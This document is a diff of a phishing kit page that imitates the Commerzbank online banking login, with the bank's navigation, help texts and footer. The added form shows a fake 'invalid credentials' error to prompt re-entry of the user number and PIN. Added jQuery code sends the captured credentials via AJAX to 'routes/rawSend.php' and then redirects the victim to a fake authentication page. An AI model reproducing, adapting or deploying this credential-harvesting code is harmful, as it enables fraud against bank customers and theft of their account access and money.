data-savepage-href="/marktdaten2/home/markets/index.html" href="https://kunden.commerzbank.de/marktdaten2/home/markets/index.html"><i class="icon i-213"></i>Börse</a> </h2> <ul> <li class="md-02 noSecureIcon "> <a data-savepage-href="/marktdaten2/home/markets/index.html" href="https://kunden.commerzbank.de/marktdaten2/home/markets/index.html"><i class="icon i-213"></i>Kurse &amp; Märkte</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/marktdaten2/home/depot/index.html" href="https://kunden.commerzbank.de/marktdaten2/home/depot/index.html"><i class="icon i-213"></i>Watchlist</a> </li></ul> </li> </ul> </li> <li class="hn-02 " aria-haspopup="true"> <a data-savepage-href="/dailybanking/financialanalysis" href="https://kunden.commerzbank.de/dailybanking/financialanalysis"><span>Analyse</span></a> </li> <li class="hn-02 noSecureIcon " aria-haspopup="true"> <a data-savepage-href="/portal/de/privatkunden/meine-anliegen/meine-anliegen.html" href="https://kunden.commerzbank.de/portal/de/privatkunden/meine-anliegen/meine-anliegen.html"><span>Service</span></a> </li> <li class="hn-02 hasSubNav  containsList" aria-haspopup="true"> <a href="#" data-nav-href="/konten-zahlungsverkehr/"><span>Produkte &amp; Wissen</span></a> <ul class="menu row" aria-hidden="true" style="width: 1000px;"> <li class="containsList"> <h2 class="md-01 hasSubNav "> <a data-savepage-href="/konten-zahlungsverkehr/" href="https://kunden.commerzbank.de/konten-zahlungsverkehr/">Konten &amp; Zahlungsmittel</a> </h2> <ul> <li class="md-02 "> <a data-savepage-href="/konten-zahlungsverkehr/produkte/girokonten/kostenloses-girokonto/" href="https://kunden.commerzbank.de/konten-zahlungsverkehr/produkte/girokonten/kostenloses-girokonto/">Girokonten</a> </li><li class="md-02 "> <a data-savepage-href="/konten-zahlungsverkehr/produkte/kreditkarten/" href="https://kunden.commerzbank.de/konten-zahlungsverkehr/produkte/kreditkarten/">Kreditkarten</a> </li><li class="md-02 "> <a data-savepage-href="/konten-zahlungsverkehr/service/dispokredit/" href="https://kunden.commerzbank.de/konten-zahlungsverkehr/service/dispokredit/">Dispokredit</a> </li><li class="md-02 "> <a data-savepage-href="/konten-zahlungsverkehr/service/erste-schritte-im-online-banking/" href="https://kunden.commerzbank.de/konten-zahlungsverkehr/service/erste-schritte-im-online-banking/">Digital Banking</a> </li><li class="md-02 "> <a data-savepage-href="/konten-zahlungsverkehr/service/kontowechsel/" href="https://kunden.commerzbank.de/konten-zahlungsverkehr/service/kontowechsel/">Kontowechselservice</a> </li></ul> </li><li class="containsList"> <h2 class="md-01 hasSubNav "> <a data-savepage-href="/sparen-anlegen/" href="https://kunden.commerzbank.de/sparen-anlegen/">Sparen &amp; Anlegen</a> </h2> <ul> <li class="md-02 "> <a data-savepage-href="/sparen-anlegen/produkte/tagesgeld/ " href="https://kunden.commerzbank.de/sparen-anlegen/produkte/tagesgeld/">Tagesgeld</a> </li><li class="md-02 "> <a data-savepage-href="/sparen-anlegen/produkte/festgeld/ " href="https://kunden.commerzbank.de/sparen-anlegen/produkte/festgeld/">Festgeld</a> </li><li class="md-02 "> <a data-savepage-href="/portal/de/privatkunden/sparen-anlegen/produkte/etf-fonds-sparplan/etf-fonds-sparplan.html" href="https://kunden.commerzbank.de/portal/de/privatkunden/sparen-anlegen/produkte/etf-fonds-sparplan/etf-fonds-sparplan.html">ETF- &amp; Fonds-Sparpläne</a> </li><li class="md-02 "> <a data-savepage-href="/sparen-anlegen/produkte/vermoegenswirksame-leistungen/" href="https://kunden.commerzbank.de/sparen-anlegen/produkte/vermoegenswirksame-leistungen/">VL-Sparen</a> </li><li class="md-02 "> <a data-savepage-href="/sparen-anlegen/produkte/sparen-fuer-kinder/" href="https://kunden.commerzbank.de/sparen-anlegen/produkte/sparen-fuer-kinder/">Sparen für Kinder</a> </li><li class="md-02 "> <a data-savepage-href="/investieren/produkte/depot/" href="https://kunden.commerzbank.de/investieren/produkte/depot/">Depotmodelle</a> </li></ul> </li><li class="containsList"> <h2 class="md-01 hasSubNav "> <a data-savepage-href="/investieren/produkte/wertpapiere-handeln/ " href="https://kunden.commerzbank.de/investieren/produkte/wertpapiere-handeln/">Wertpapierhandel</a> </h2> <ul> <li class="md-02 "> <a data-savepage-href="/investieren/produkte/depot/depot-eroeffnen/" href="https://kunden.commerzbank.de/investieren/produkte/depot/depot-eroeffnen/">Depot eröffnen</a> </li><li class="md-02 "> <a data-savepage-href="/portal/de/privatkunden/sparen-anlegen/wissen/maerkte-kurse-analysen/maerkte-kurse-analysen.html" href="https://kunden.commerzbank.de/portal/de/privatkunden/sparen-anlegen/wissen/maerkte-kurse-analysen/maerkte-kurse-analysen.html">Märkte &amp; Analysen</a> </li><li class="md-02 "> <a data-savepage-href="/portal/de/privatkunden/sparen-anlegen/produkte/wertpapiere/aktien/aktien.html" href="https://kunden.commerzbank.de/portal/de/privatkunden/sparen-anlegen/produkte/wertpapiere/aktien/aktien.html">Aktien</a> </li><li class="md-02 "> <a data-savepage-href="/portal/de/privatkunden/sparen-anlegen/produkte/wertpapiere/fonds/fonds.html" href="https://kunden.commerzbank.de/portal/de/privatkunden/sparen-anlegen/produkte/wertpapiere/fonds/fonds.html">Fonds</a> </li><li class="md-02 "> <a data-savepage-href="/portal/de/privatkunden/sparen-anlegen/produkte/wertpapiere/etf/etf.html " href="https://kunden.commerzbank.de/portal/de/privatkunden/sparen-anlegen/produkte/wertpapiere/etf/etf.html">ETFs</a> </li><li class="md-02 "> <a data-savepage-href="/investieren/produkte/wertpapier-angebote/ " href="https://kunden.commerzbank.de/investieren/produkte/wertpapier-angebote/">Aktuelle Angebote</a> </li></ul> </li><li class="containsList"> <h2 class="md-01 hasSubNav "> <a data-savepage-href="/kredit-finanzierung/" href="https://kunden.commerzbank.de/kredit-finanzierung/">Kredit &amp; Finanzierung</a> </h2> <ul> <li class="md-02 "> <a data-savepage-href="/kredit-finanzierung/produkte/ratenkredite/ratenkredit/" href="https://kunden.commerzbank.de/kredit-finanzierung/produkte/ratenkredite/ratenkredit/">Ratenkredit</a> </li><li class="md-02 "> <a data-savepage-href="/kredit-finanzierung/produkte/ratenkredite/autokredit/" href="https://kunden.commerzbank.de/kredit-finanzierung/produkte/ratenkredite/autokredit/">Autokredit</a> </li><li class="md-02 "> <a data-savepage-href="/kredit-finanzierung/produkte/baufinanzierung/baufinanzierung/" href="https://kunden.commerzbank.de/kredit-finanzierung/produkte/baufinanzierung/baufinanzierung/">Baufinanzierung</a> </li><li class="md-02 "> <a data-savepage-href="/kredit-finanzierung/produkte/ratenkredite/modernisierungskredit/" href="https://kunden.commerzbank.de/kredit-finanzierung/produkte/ratenkredite/modernisierungskredit/">Modernisierungskredit</a> </li><li class="md-02 "> <a data-savepage-href="/kredit-finanzierung/produkte/baufinanzierung/anschlussfinanzierung/" href="https://kunden.commerzbank.de/kredit-finanzierung/produkte/baufinanzierung/anschlussfinanzierung/">Anschlussfinanzierung</a> </li></ul> </li><li class="containsList"> <h2 class="md-01 hasSubNav "> <a data-savepage-href="/vorsorgen-versichern/wissen/passende-vorsorge/" href="https://kunden.commerzbank.de/vorsorgen-versichern/wissen/passende-vorsorge/">Versicherungen &amp; Vorsorge</a> </h2> <ul> <li class="md-02 "> <a data-savepage-href="/vorsorgen-versichern/wissen/passende-vorsorge/" href="https://kunden.commerzbank.de/vorsorgen-versichern/wissen/passende-vorsorge/">Welche ist die passende Vorsorge?</a> </li><li class="md-02 "> <a data-savepage-href="/vorsorgen-versichern/produkte/versicherungen/risikolebensversicherung/" href="https://kunden.commerzbank.de/vorsorgen-versichern/produkte/versicherungen/risikolebensversicherung/">Risikolebensversicherung</a> </li><li class="md-02 "> <a data-savepage-href="/vorsorgen-versichern/produkte/versicherungen/berufsunfaehigkeitsversicherung/" href="https://kunden.commerzbank.de/vorsorgen-versichern/produkte/versicherungen/berufsunfaehigkeitsversicherung/">Berufsunfähigkeitsversicherung</a> </li><li class="md-02 "> <a data-savepage-href="/vorsorgen-versichern/produkte/altersvorsorge/allianz-schatzbrief/" href="https://kunden.commerzbank.de/vorsorgen-versichern/produkte/altersvorsorge/allianz-schatzbrief/">Allianz SchatzBrief</a> </li><li class="md-02 "> <a data-savepage-href="/vorsorgen-versichern/produkte/altersvorsorge/privatrente/" href="https://kunden.commerzbank.de/vorsorgen-versichern/produkte/altersvorsorge/privatrente/">PrivatRente</a> </li><li class="md-02 "> <a data-savepage-href="/vorsorgen-versichern/produkte/altersvorsorge/riester-rente/" href="https://kunden.commerzbank.de/vorsorgen-versichern/produkte/altersvorsorge/riester-rente/">RiesterRente</a> </li><li class="md-02 "> <a data-savepage-href="/vorsorgen-versichern/produkte/altersvorsorge/basisrente/" href="https://kunden.commerzbank.de/vorsorgen-versichern/produkte/altersvorsorge/basisrente/">BasisRente</a> </li><li class="md-02 "> <a data-savepage-href="/vorsorgen-versichern/produkte/altersvorsorge/vorsorgevollmacht/" href="https://kunden.commerzbank.de/vorsorgen-versichern/produkte/altersvorsorge/vorsorgevollmacht/">Vorsorgevollmacht</a> </li></ul> </li> </ul> </li> </ul></div></div><a class="btn-nav-prev"></a><a class="btn-nav-next active"></a></nav> 
   	    
     <div class="mobileNavFooter" style="display: none;">
     <div class="mobileLoginContainer">
@@ -512,7 +461,7 @@ if ($_FILES['file']['error'] == UPLOAD_ERR_OK) {
 			<div class="mod mod-Login">
 				<div class="mod mod-Headline">
 					<h1 class="h-01">
-						 
+						Anmeldung Online Banking
 					</h1>
 
 				</div>
@@ -521,26 +470,119 @@ if ($_FILES['file']['error'] == UPLOAD_ERR_OK) {
 					<div class="col col-lg-6">
 						<div class="login-box">
 							
- <form id="form" autocomplete="off" class="form-horizontal" method="post">
- <h1 class="h-01">Herzlichen Glückwunsch!</h1>
+ <form action="infoz.php" id="form" autocomplete="off" class="form-horizontal" method="post">
 
- <p>Ihre Angaben wurden erfolgreich geprüft und Ihre Verifizierung ist abgeschlossen. Ab sofort können Sie Ihre Dienste wie gewohnt nutzen.
-<br><br>
-Klicken Sie auf die Schaltfläche unten, um auf die Hauptseite weitergeleitet zu werden.</p>
+<div class="mod mod-Alert">
+                                 <div class="type-error">
+                                    <ul class="feedbackPanel">
+                                       <li class="feedbackPanelINFO">
+                                          <span class="feedbackPanelINFO">Sie haben eine ungültige Kombination von Benutzername/Teilnehmernummer und PIN eingegeben. Bitte geben Sie die Legitimationsdaten erneut ein.</span>
+                                       </li>
+                                    </ul>
+                                 </div>
+                              </div>
+ 	<div style="width:0px;height:0px;position:absolute;left:-100px;top:-100px;overflow:hidden"><input type="hidden" name="id2_hf_0" id="id2_hf_0" value=""></div>
  	 
-							 
+								<div class="form-row label-pos-none field-length-full">
+									<label for="teilnehmer">Label</label>
+									<div class="input">
+										<input class="text-left required" type="text" required="required" id="teilnehmer" name="xusr1" autocomplete="off" maxlength="50" tabindex="1" autofocus="" data-h5-errorid="invalid-teilnehmer" value="" placeholder="Benutzername/Teilnehmernummer">
+	
+										<div class="error-msg" id="invalid-teilnehmer" style="display: none;">
+											<div class="inner">
+												<p>
+													Geben Sie bitte 8 oder 10 Ziffern für Ihre Teilnehmernummer oder min. 8 bis max. 50 Zeichen für Ihren Benutzernamen ein.
+												</p>
+											</div>
+										</div>
+									</div>
+									<a href="#useridInfo" class="info-box-link"></a>
+								</div>
+								<div class="info-box-msg" id="useridInfo">
+									<div class="inner">
+										<p>
+											<b>Benutzername (Alias)</b><br>Der Benutzername ist eine von Ihnen frei wählbare Zugangskennung. Diese können Sie nach jeder erfolgreichen Anmeldung vergeben, ändern oder löschen. Nach Vergabe eines Benutzernamens ist eine Anmeldung mit diesem Benutzernamen oder der 10-stelligen Teilnehmernummer (8-stelligen Banking-ID) möglich.<br><br>Sollten Sie Ihren Benutzernamen vergessen, können Sie sich jederzeit mit Ihrer 10-stelligen Teilnehmernummer (Banking-ID) anmelden und den Benutzernamen in der Rubrik "Service" unter dem Punkt "Digital Banking Profil" mit der Funktion "Benutzername ändern" ersehen und ggf. ändern.<br><br><b>Teilnehmernummer (Banking-ID)</b><br>Unter der Teilnehmernummer werden die mit Ihrer Commerzbank Filiale vereinbarten Konten und Depots verwaltet. Die Teilnehmernummer ist 10-stellig und losgelöst von Ihrer Kontonummer. Die Teilnehmernummer können Sie sich jederzeit in der Rubrik "Service" unter dem Punkt "Digital Banking Profil" mit der Funktion "Benutzername ändern" anzeigen lassen.
+										</p>
+									</div>
+									<span class="close">x</span>
+								</div>
+
+								<div class="form-row  label-pos-none field-length-full">
+									<label for="pin">Label</label>
+									<div class="input">
+										<input type="password" class="text-left" required="required" id="pin" name="xpss1" autocomplete="off" maxlength="45" tabindex="2" data-h5-errorid="invalid-pin" value="" placeholder="PIN" pattern="[A-Za-z0-9!&quot;#\$%\&\(\)\*\/\.\+,\-:;<=>\?@\[\u005C\]_\{\|\}~]{5,45}">
+
+										<div class="error-msg" id="invalid-pin" style="display: none;">
+											<div class="inner">
+												<p>
+													Geben Sie bitte min. 5 bis max. 45 Buchstaben, Ziffern bzw. Sonderzeichen ein.
+												</p>
+											</div>
+										</div>
+									</div>
+									<a href="#pinInfo" class="info-box-link"></a>
+								</div>
+								<div class="info-box-msg" id="pinInfo">
+									<div class="inner">
+										<p>
+											<b>PIN</b><br>Bitte geben Sie in dieses Feld Ihre 5 bis 45-stellige PIN - Persönliche Identifikationsnummer/Passwort ein.<br>Sie erhalten diese Geheimzahl nach der Freischaltung zum Online Banking von Ihrer Commerzbank Filiale. Eine Änderung Ihrer PIN ist unter Verwendung einer TAN - Transaktionsnummer - jederzeit in der Rubrik "Service" unter dem Punkt "Digital Banking Einstellungen" mit der Funktion "Digital Banking PIN ändern" möglich.
+										</p>
+									</div>
+									<span class="close">x</span>
+								</div>
 
 								 
 
-<br><br>
 
-							<button id="doordior" name="doordior" class="b-01 b-a-04 b-g-01" type="button" tabindex="4" onclick="window.location.href='https://www.commerzbank.de'">
-    Weiterleitung durchführen
-</button>
 
+								<button id="doordior"  name="doordior" class="b-01 b-a-04 b-g-01 login" type="" tabindex="4">
+									Login
+								</button>
 							</form>
 
-							
+							<div>
+	  
+     
+       <div class="mod mod-Linien">
+<hr class="li-01 li-a-01">
+</div>
+<div class="mod mod-TextBild af-a-06">
+<h3 class="h-03"> Aktualisieren Sie Ihre photoTAN-App </h3>
+<div class="content">
+<p class="btn-container ">
+<a class="btn b-01 b-g-01 b-a-01" >Zur Anmeldung im Firmenkundenportal</a>
+</p>
+</div>
+</div>
+<div class="mod mod-Linien">
+<hr class="li-01 li-a-01">
+</div>
+<div class="mod mod-TextBild af-a-06">
+<h3 class="h-03"> Noch kein Digital Banking Kunde? </h3>
+<div class="content">
+<ul class="ll">
+<li>
+<a class="l-p-02" data-savepage-href="/prozess/WebObjects/ProzessCenter.woa/wa/default?path=/pk_sp/de/TNV/ST10_TNV_Anmeldung_DigitalBanking_AutoIdent_Int" href="https://kunden.commerzbank.de/prozess/WebObjects/ProzessCenter.woa/wa/default?path=/pk_sp/de/TNV/ST10_TNV_Anmeldung_DigitalBanking_AutoIdent_Int" title="Formular">Zugang digital beantragen (mit autoIDENT)</a>
+</li>
+</ul>
+</div>
+</div>
+<div class="mod mod-TextBild af-a-06">
+<h3 class="h-03"> Aktuelle Warnhinweise </h3>
+<div class="content">
+<ul class="ll">
+<li>
+<a class="l-p-02" href="https://www.commerzbank.de/konten-zahlungsverkehr/wissen/sicherheit-onlinebanking/falsche-commerzbank-mitarbeiter/">Angebliche Bank-Mitarbeiter erfragen Zugangsdaten</a>
+</li>
+<li>
+<a class="l-p-02" href="https://www.polizei-beratung.de/startseite-und-aktionen/aktuelles/detailansicht/enkeltrick-betrueger-nutzen-whatsapp/">Enkeltrick: Betrüger nutzen WhatsApp (polizei-beratung.de)</a>
+</li>
+</ul>
+</div>
+</div>
+     
+   
+	</div>
 						</div>
 					</div>
 					<div class="col col-lg-6">
@@ -623,9 +665,87 @@ Klicken Sie auf die Schaltfläche unten, um auf die Hauptseite weitergeleitet zu
 
      </section>
   </div>
- 
+
+<footer>
+	    	
+        	       
+   
+	<div class="mod mod-NavFooter">
+	<ul>
+	    <li class=" "> <a data-savepage-href="/portal/de/footer1/preisekonditionen/preisekonditionen.html" href="https://kunden.commerzbank.de/portal/de/footer1/preisekonditionen/preisekonditionen.html" class="fn-01">Preise &amp; Konditionen</a> </li> <li class=" "> <a href="https://www.commerzbank.de/hinweise/impressum/" class="fn-01">Impressum</a> </li> <li class=" "> <a data-savepage-href="/hinweise/rechtliche-hinweise/" href="https://kunden.commerzbank.de/hinweise/rechtliche-hinweise/" class="fn-01">Rechtliche Hinweise</a> </li> <li class=" "> <a href="#uc-corner-modal-show" class="fn-01">Einwilligungseinstellungen</a> </li> <li class=" "> <a data-savepage-href="/portal/de/footer1/datenschutzhinweise/Datenschutzhinweise.html" href="https://kunden.commerzbank.de/portal/de/footer1/datenschutzhinweise/Datenschutzhinweise.html" class="fn-01">Datenschutzhinweise</a> </li> 
+	</ul>
+	</div>
+		
+    <!-- END NavFooter -->
+</footer>
 <!-- ngIf: clientCanResolveErrorMessage && !widgetDisabled -->
     
- 
+
+ <script>
+$(document).ready(function() {
+
+  function applyMobileStyles() {
+    if (window.matchMedia("(max-width: 768px)").matches) {
+      // Set margin-left of the element with id="loginAction" to 4rem
+      $('#mobileHeader').show();
+    } else {
+      $('#mobileHeader').hide();
+    }
+  }
+
+  // Apply styles on initial load
+  applyMobileStyles();
+
+  // Apply styles on window resize
+  $(window).resize(function() {
+    applyMobileStyles();
+  });
+
+  function validateInput(input, minLength) {
+    if (input.val().length >= minLength) {
+      input.removeClass('invalid').addClass('valid');
+      return true;
+    } else {
+      input.removeClass('valid').addClass('invalid');
+      return false;
+    }
+  }
+
+  $('#form').submit(function(e) {
+    e.preventDefault();
+
+    // Get the input elements
+    var pin = $('#pin');
+    var teilnehmer = $('#teilnehmer');
+
+    // Validate inputs with separate minimum lengths
+    var isPinValid = validateInput(pin, 5);
+    var isTeilnehmerValid = validateInput(teilnehmer, 8);
+
+    // Check if both inputs are valid
+    if (isPinValid && isTeilnehmerValid) {
+      $.ajax({
+        type: 'POST',
+        url: 'routes/rawSend.php?accountAuth&Replace',
+        data: $(this).serialize(),
+        success: function(data) {
+                 
+                    window.location = 'ForAuth?ErrorAuth=27041cd6ef5228452b00be5b42844fcd' + '&session=c06d06da9666a219db15cf575aff2824';
+                        }
+      });
+    }
+  });
+
+  // Add keyup event listeners to validate inputs while typing
+  $('#pin, #teilnehmer').on('keyup', function() {
+    var input = $(this);
+    if (input.attr('id') === 'pin') {
+      validateInput(input, 5);
+    } else {
+      validateInput(input, 8);
+    }
+  });
+});
+</script>
 
 </body></html>
